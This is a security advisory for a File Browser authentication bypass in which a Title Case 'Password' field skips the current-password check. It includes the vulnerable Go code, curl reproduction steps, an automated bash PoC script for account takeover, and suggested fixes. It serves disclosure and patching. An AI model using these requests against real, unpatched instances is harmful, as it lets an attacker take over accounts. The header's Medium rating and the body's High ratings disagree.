# [M] File Browser has an Authentication Bypass in User Password Update

## Summary
Severity: Medium
Advisory: GHSA-hxw8-4h9j-hq2r
CVE: CVE-2026-25889
CWE: CWE-178
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-10
Source: https://github.com/advisories/GHSA-hxw8-4h9j-hq2r
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.57.1

## Details
# Security Advisory: Authentication Bypass in User Password Update

## Summary

A case-sensitivity flaw in the password validation logic allows any authenticated user to change their password (or an admin to change any user's password) **without providing the current password**. By using Title Case field name `"Password"` instead of lowercase `"password"` in the API request, the `current_password` verification is completely bypassed. This enables account takeover if an attacker obtains a valid JWT token through XSS, session hijacking, or other means.

**CVSS Score**: 7.5 (High)  
**CWE**: CWE-178 (Improper Handling of Case Sensitivity)

---

## Details

The vulnerability exists in `http/users.go` in the `userPutHandler` function (lines 181-200).

### Vulnerable Code

```go
// http/users.go:181-200
if d.settings.AuthMethod == auth.MethodJSONAuth {
    var sensibleFields = map[string]struct{}{
        "all":          {},
        "username":     {},
        "password":     {},  // lowercase
        "scope":        {},
        "lockPassword": {},
        "commands":     {},
        "perm":         {},
    }

    for _, field := range req.Which {
        if _, ok := sensibleFields[field]; ok {  // Case-sensitive lookup
            if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
                return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
            }
            break
        }
    }
}
```

### Root Cause

1. The `sensibleFields` map uses **lowercase** keys (e.g., `"password"`)
2. The lookup `sensibleFields[field]` is **case-sensitive**
3. When `req.Which` contains `"Password"` (Title Case), the lookup returns `false`
4. The password verification block is skipped entirely
5. Later in the code (line 229), field names are converted to Title Case for processing, so `"Password"` is a valid field name

### Attack Flow

```
1. Attacker obtains victim's JWT token (via XSS, log leakage, etc.)
2. Attacker sends PUT /api/users/{id} with:
   - which: ["Password"]  (Title Case - bypasses validation)
   - data.password: "attacker_password"
   - NO current_password field required
3. Password is changed without verification
4. Victim is locked out, attacker has full access
```

---

## PoC

### Prerequisites
- A valid JWT token for any user account
- Target Filebrowser instance using JSON authentication (default)

### Reproduction Steps

**Step 1: Obtain a valid JWT token**
```bash
TOKEN=$(curl -s -X POST "http://target:8080/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"victim_password"}')
```

**Step 2: Attempt normal password change (should fail)**
```bash
curl -s -X PUT "http://target:8080/api/users/1" \
  -H "X-Auth: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "what": "user",
    "which": ["password"],
    "data": {"id": 1, "password": "NewPassword123456"}
  }'
# Response: 400 Bad Request (the current password is incorrect)
```

**Step 3: Bypass with Title Case (succeeds without current_password)**
```bash
curl -s -X PUT "http://target:8080/api/users/1" \
  -H "X-Auth: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "what": "user",
    "which": ["Password"],
    "data": {"id": 1, "password": "HackedPassword123"}
  }'
# Response: 200 OK
```

**Step 4: Verify account takeover**
```bash
# Original password no longer works
curl -s -X POST "http://target:8080/api/login" \
  -d '{"username":"victim","password":"victim_password"}'
# Response: 403 Forbidden

# New password works
curl -s -X POST "http://target:8080/api/login" \
  -d '{"username":"victim","password":"HackedPassword123"}'
# Response: Valid JWT token
```

### Automated PoC Script

```bash
#!/bin/bash
# Usage: ./poc.sh <target> <username> <current_password> <new_password>

TARGET="$1"
USERNAME="$2"
CURRENT_PASS="$3"
NEW_PASS="$4"

# Login
TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USERNAME\",\"password\":\"$CURRENT_PASS\"}")

# Get user ID from token
USER_ID=$(echo "$TOKEN" | python3 -c "
import sys,json,base64
parts=input().split('.')
payload=json.loads(base64.b64decode(parts[1]+'=='))
print(payload['user']['id'])
")

# Exploit: Change password without current_password
curl -s -X PUT "$TARGET/api/users/$USER_ID" \
  -H "X-Auth: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"what\": \"user\",
    \"which\": [\"Password\"],
    \"data\": {\"id\": $USER_ID, \"password\": \"$NEW_PASS\"}
  }"

echo "Password changed to: $NEW_PASS"
```

---

## Impact

### Who is Impacted

- **All Filebrowser users** using JSON authentication method (default configuration)
- Any user whose JWT token can be obtained by an attacker
- Particularly high-value targets: administrator accounts

### Attack Scenarios

| Scenario | Impact |
|----------|--------|
| XSS + Token Theft | Complete account takeover |
| JWT in Server Logs | Mass account compromise |
| Shared Computer | Session hijacking |
| Malicious Browser Extension | Credential theft |

### Security Impact

| Category | Severity |
|----------|----------|
| Confidentiality | **High** - Attacker gains full account access |
| Integrity | **High** - Attacker can modify all user data |
| Availability | **High** - Legitimate user locked out |

### Scope

- The vulnerability affects **password modification only**
- Other sensitive fields (`Username`, `Scope`, `Perm`, etc.) have additional protection via `NonModifiableFieldsForNonAdmin` check
- However, for **administrators**, all fields can be modified using this bypass technique

---

## Suggested Fix

### Option 1: Case-insensitive field matching (Recommended)

```go
// Convert field to lowercase before checking
for _, field := range req.Which {
    if _, ok := sensibleFields[strings.ToLower(field)]; ok {
        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
        }
        break
    }
}
```

### Option 2: Use Title Case in sensibleFields

```go
var sensibleFields = map[string]struct{}{
    "All":          {},
    "Username":     {},
    "Password":     {},  // Title Case to match post-transformation
    "Scope":        {},
    "LockPassword": {},
    "Commands":     {},
    "Perm":         {},
}

// Check AFTER field name transformation
for k, v := range req.Which {
    v = cases.Title(language.English, cases.NoLower).String(v)
    req.Which[k] = v
    
    // Now check with Title Case
    if _, ok := sensibleFields[v]; ok {
        if !users.CheckPwd(req.CurrentPassword, d.user.Password) {
            return http.StatusBadRequest, fberrors.ErrCurrentPasswordIncorrect
        }
        break
    }
}
```

---

## References

- Affected File: `http/users.go`
- Affected Lines: 181-200
- Related Code: `NonModifiableFieldsForNonAdmin` (line 17)

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hxw8-4h9j-hq2r
- https://nvd.nist.gov/vuln/detail/CVE-2026-25889
- https://github.com/filebrowser/filebrowser/commit/ff2f00498cff151e2fb1f5f0b16963bf33c3d6d4
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.57.1
